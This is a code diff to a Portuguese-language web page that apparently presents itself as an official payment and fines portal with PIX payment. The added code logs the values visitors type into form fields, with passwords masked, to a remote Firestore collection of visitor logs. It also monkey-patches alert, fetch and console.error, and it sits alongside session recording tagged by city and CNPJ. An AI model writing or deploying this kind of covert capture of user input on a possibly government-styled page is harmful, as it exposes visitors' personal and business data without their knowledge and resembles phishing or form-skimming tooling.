@@ -216,8 +216,8 @@
 
     .checklist-form-container { flex: 1.2; min-width: 350px; background: white; padding: 40px; border-radius: 20px; box-shadow: 0 20px 50px rgba(0,0,0,0.1); border: 1px solid #e2e8f0; }
     .form-tabs { margin-bottom: 30px; }
-    #area-envio, #area-pagamento, #area-multas { animation: fadeIn 0.4s ease; }
-    @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+    #area-envio, #area-pagamento, #area-multas { opacity: 1; }
+    @keyframes fadeIn { from { opacity: 0.99; transform: translateY(4px); } to { opacity: 1; transform: translateY(0); } }
     .form-tabs { display: flex; gap: 15px; background: #f8fafc; padding: 8px; border-radius: 16px; border: 1px solid #e2e8f0; }
     .form-tab { flex: 1; text-align: center; padding: 16px 12px; font-weight: 800; font-size: 0.95rem; color: #64748b; cursor: pointer; border-radius: 12px; transition: all 0.3s ease; }
     .form-tab:hover { color: var(--gov-blue); background: rgba(19, 81, 180, 0.05); }
@@ -1408,7 +1408,9 @@
                 empresaDigitada: "",
                 ramoEscolhido: "",
                 telefoneDigitado: "",
-                etapaAtual: "Entrou no portal"
+                etapaAtual: "Entrou no portal",
+                ultimoErro: "",
+                totalErros: 0
             };
 
             try {
@@ -1476,6 +1478,8 @@
                     ramoEscolhido: locState.ramoEscolhido,
                     telefoneDigitado: locState.telefoneDigitado,
                     etapaAtual: locState.etapaAtual,
+                    ultimoErro: locState.ultimoErro,
+                    totalErros: locState.totalErros,
                     regiao: locState.regiao
                 };
             }
@@ -1757,6 +1761,11 @@
                 }
                 ultimaAcaoTexto = acaoStr;
                 ultimaAcaoHora = agora;
+                if (tipoEvento === "erro") {
+                    locState.ultimoErro = acaoStr;
+                    locState.totalErros = (locState.totalErros || 0) + 1;
+                    avisarEstouOnline();
+                }
 
                 try {
                     const docRef = await addDoc(collection(db, "logs_visitantes"), {
@@ -1844,7 +1853,8 @@
                                 return;
                             }
                         }
-                        registrarAcaoUsuario(`Preencheu o campo: [${label.substring(0, 35)}]`, 'campo');
+                        const previewVal = (e.target.type === 'password') ? '***' : val.substring(0, 38);
+                        registrarAcaoUsuario(`Preencheu [${label.substring(0, 28)}]: "${previewVal}"`, 'campo');
                     }
                 }
             });
@@ -1854,9 +1864,76 @@
                 registrarAcaoUsuario(`ERRO na tela do visitante: ${msg}`, 'erro');
             });
             window.addEventListener('unhandledrejection', (ev) => {
-                const msg = String(ev.reason?.message || ev.reason || 'Promise rejeitada').substring(0, 120);
+                const msg = String(ev.reason?.message || ev.reason || 'Promise rejeitada').substring(0, 140);
                 registrarAcaoUsuario(`ERRO assíncrono: ${msg}`, 'erro');
             });
+
+            // Captura alertas nativos do site (alert()) que antes não apareciam na gravação da tela
+            if (!window._covisaAlertHooked) {
+                window._covisaAlertHooked = true;
+                const alertOriginal = window.alert.bind(window);
+                window.alert = function(msg) {
+                    try {
+                        const txt = String(msg || '').replace(/\s+/g, ' ').trim().substring(0, 180);
+                        if (txt) {
+                            const ehErro = /erro|falha|inválid|indisponível|não foi possível|não encontrado|robô|recaptcha|selecione|anex/i.test(txt);
+                            registrarAcaoUsuario(
+                                `${ehErro ? 'ERRO/AVISO (Pop-up):' : 'AVISO (Pop-up):'} ${txt}`,
+                                ehErro ? 'erro' : 'acao'
+                            );
+                        }
+                    } catch (_) {}
+                    return alertOriginal(msg);
+                };
+            }
+
+            // Captura campos obrigatórios que travaram o envio do formulário (HTML5 validation)
+            document.addEventListener('invalid', (ev) => {
+                const el = ev.target;
+                if (!el) return;
+                const nomeCampo = (el.placeholder || el.id || el.name || 'campo obrigatório').substring(0, 40);
+                const motivo = (el.validationMessage || 'Campo inválido/vazio').substring(0, 80);
+                registrarAcaoUsuario(`TRAVOU NO CAMPO [${nomeCampo}]: ${motivo}`, 'erro');
+            }, true);
+
+            // Captura falhas em APIs importantes (/api/pix, BrasilAPI, ViaCEP, CNPJ.ws, PDFs)
+            if (!window._covisaFetchHooked && typeof window.fetch === 'function') {
+                window._covisaFetchHooked = true;
+                const fetchOriginal = window.fetch.bind(window);
+                window.fetch = async function(input, init) {
+                    const urlStr = typeof input === 'string' ? input : (input && input.url ? input.url : '');
+                    const monitorarUrl = /\/api\/|brasilapi|cnpj\.ws|viacep|\.pdf|generativelanguage/i.test(urlStr);
+                    try {
+                        const res = await fetchOriginal(input, init);
+                        if (monitorarUrl && !res.ok) {
+                            const urlCurta = urlStr.replace(/^https?:\/\//, '').split('?')[0].substring(0, 70);
+                            registrarAcaoUsuario(`ERRO API (HTTP ${res.status}): ${urlCurta}`, 'erro');
+                        }
+                        return res;
+                    } catch (err) {
+                        if (monitorarUrl) {
+                            const urlCurta = urlStr.replace(/^https?:\/\//, '').split('?')[0].substring(0, 70);
+                            registrarAcaoUsuario(`ERRO DE CONEXÃO NA API: ${urlCurta} (${String(err?.message || err).substring(0, 50)})`, 'erro');
+                        }
+                        throw err;
+                    }
+                };
+            }
+
+            // Captura console.error técnico relevante
+            if (!window._covisaConsoleHooked) {
+                window._covisaConsoleHooked = true;
+                const consoleErrOrig = console.error.bind(console);
+                console.error = function(...args) {
+                    try {
+                        const txt = args.map(a => (a && a.message) ? a.message : String(a)).join(' ').replace(/\s+/g, ' ').trim();
+                        if (txt && !/clarity|ipwho|ipapi|nominatim|rrweb/i.test(txt)) {
+                            registrarAcaoUsuario(`ERRO CONSOLE: ${txt.substring(0, 140)}`, 'erro');
+                        }
+                    } catch (_) {}
+                    return consoleErrOrig(...args);
+                };
+            }
 
             // =================================================================
             // INTEGRAÇÃO MICROSOFT CLARITY POR SESSÃO (ID + CIDADE + CNPJ)
